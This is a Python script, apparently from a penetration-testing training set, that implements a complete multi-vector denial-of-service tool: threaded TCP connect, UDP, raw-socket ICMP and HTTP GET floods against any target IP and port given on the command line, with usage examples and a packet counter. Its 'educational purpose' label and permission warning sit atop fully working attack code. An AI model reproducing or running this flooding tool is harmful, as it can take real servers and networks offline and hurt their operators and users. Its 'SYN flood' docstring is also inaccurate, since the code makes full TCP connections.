#!/usr/bin/env python3
"""
Intermediate DOS Attack Script
Author: HTB Training
Description: Multi-vector DOS attack with UDP/TCP/ICMP flooding
Educational Purpose Only - Use responsibly and legally
"""

import socket
import sys
import time
import random
import threading
import struct
from concurrent.futures import ThreadPoolExecutor

class IntermediateDOS:
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.packets_sent = 0
        self.running = True
    
    def tcp_flood(self, duration=60):
        """TCP SYN flood attack"""
        print("[*] Starting TCP flood attack...")
        start_time = time.time()
        
        while self.running and (time.time() - start_time) < duration:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                
                # Random source port
                source_port = random.randint(1024, 65535)
                sock.bind(('', source_port))
                
                sock.connect((self.target_ip, self.target_port))
                sock.close()
                
                self.packets_sent += 1
                
            except:
                pass
            
            time.sleep(0.001)
    
    def udp_flood(self, duration=60):
        """UDP flood attack"""
        print("[*] Starting UDP flood attack...")
        start_time = time.time()
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        while self.running and (time.time() - start_time) < duration:
            try:
                # Random payload
                payload = random._urandom(random.randint(1, 1024))
                
                # Random port if target_port is 0
                port = self.target_port if self.target_port != 0 else random.randint(1, 65535)
                
                sock.sendto(payload, (self.target_ip, port))
                self.packets_sent += 1
                
            except:
                pass
            
            time.sleep(0.001)
        
        sock.close()
    
    def icmp_flood(self, duration=60):
        """ICMP flood attack (requires root privileges)"""
        print("[*] Starting ICMP flood attack...")
        start_time = time.time()
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        except PermissionError:
            print("[!] ICMP flood requires root privileges, skipping...")
            return
        
        while self.running and (time.time() - start_time) < duration:
            try:
                # ICMP packet structure
                packet_id = random.randint(1, 65535)
                sequence = random.randint(1, 65535)
                
                # ICMP header: type (8), code (0), checksum (0), id, sequence
                header = struct.pack('bbHHh', 8, 0, 0, packet_id, sequence)
                data = random._urandom(56)  # Random payload
                
                # Calculate checksum
                checksum = self.calculate_checksum(header + data)
                header = struct.pack('bbHHh', 8, 0, socket.htons(checksum), packet_id, sequence)
                
                packet = header + data
                sock.sendto(packet, (self.target_ip, 0))
                self.packets_sent += 1
                
            except:
                pass
            
            time.sleep(0.001)
        
        sock.close()
    
    def calculate_checksum(self, data):
        """Calculate ICMP checksum"""
        if len(data) % 2:
            data += b'\x00'
        
        checksum = 0
        for i in range(0, len(data), 2):
            checksum += (data[i] << 8) + data[i + 1]
        
        checksum = (checksum >> 16) + (checksum & 0xFFFF)
        checksum += checksum >> 16
        return ~checksum & 0xFFFF
    
    def http_flood(self, duration=60):
        """HTTP GET flood attack"""
        print("[*] Starting HTTP flood attack...")
        start_time = time.time()
        
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        ]
        
        while self.running and (time.time() - start_time) < duration:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.target_ip, self.target_port))
                
                # Random HTTP request
                user_agent = random.choice(user_agents)
                path = f"/{random.randint(1000, 9999)}.html"
                
                request = f"GET {path} HTTP/1.1\r\n"
                request += f"Host: {self.target_ip}\r\n"
                request += f"User-Agent: {user_agent}\r\n"
                request += "Connection: keep-alive\r\n\r\n"
                
                sock.send(request.encode())
                sock.close()
                
                self.packets_sent += 1
                
            except:
                pass
            
            time.sleep(0.01)
    
    def launch_attack(self, attack_types=['tcp', 'udp'], duration=60, threads=10):
        """Launch multi-vector DOS attack"""
        print(f"[*] Launching {len(attack_types)} attack vectors with {threads} threads each")
        print(f"[*] Attack duration: {duration} seconds")
        
        with ThreadPoolExecutor(max_workers=threads * len(attack_types)) as executor:
            futures = []
            
            for attack_type in attack_types:
                for _ in range(threads):
                    if attack_type == 'tcp':
                        future = executor.submit(self.tcp_flood, duration)
                    elif attack_type == 'udp':
                        future = executor.submit(self.udp_flood, duration)
                    elif attack_type == 'icmp':
                        future = executor.submit(self.icmp_flood, duration)
                    elif attack_type == 'http':
                        future = executor.submit(self.http_flood, duration)
                    
                    futures.append(future)
            
            # Progress monitor
            start_time = time.time()
            while (time.time() - start_time) < duration:
                print(f"[+] Packets sent: {self.packets_sent}")
                time.sleep(5)
            
            self.running = False
            
            # Wait for all threads to complete
            for future in futures:
                future.result()
        
        print(f"[*] Attack completed. Total packets sent: {self.packets_sent}")

def main():
    if len(sys.argv) < 3:
        print("Usage: python3 dos_intermediate.py <target_ip> <target_port> [attack_types] [duration] [threads]")
        print("Attack types: tcp,udp,icmp,http (comma-separated)")
        print("Example: python3 dos_intermediate.py 192.168.1.100 80 tcp,udp,http 120 15")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    
    # Parse optional parameters
    attack_types = sys.argv[3].split(',') if len(sys.argv) > 3 else ['tcp', 'udp']
    duration = int(sys.argv[4]) if len(sys.argv) > 4 else 60
    threads = int(sys.argv[5]) if len(sys.argv) > 5 else 10
    
    print("="*60)
    print("INTERMEDIATE DOS ATTACK TOOL")
    print("="*60)
    print(f"Target: {target_ip}:{target_port}")
    print(f"Attack types: {', '.join(attack_types)}")
    print(f"Duration: {duration} seconds")
    print(f"Threads per attack: {threads}")
    print("WARNING: Use only on systems you own or have permission to test!")
    print("="*60)
    
    # Confirm attack
    confirm = input("Continue with attack? (y/N): ")
    if confirm.lower() != 'y':
        print("[!] Attack cancelled")
        sys.exit(0)
    
    dos_attack = IntermediateDOS(target_ip, target_port)
    
    try:
        dos_attack.launch_attack(attack_types, duration, threads)
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
        dos_attack.running = False

if __name__ == "__main__":
    main()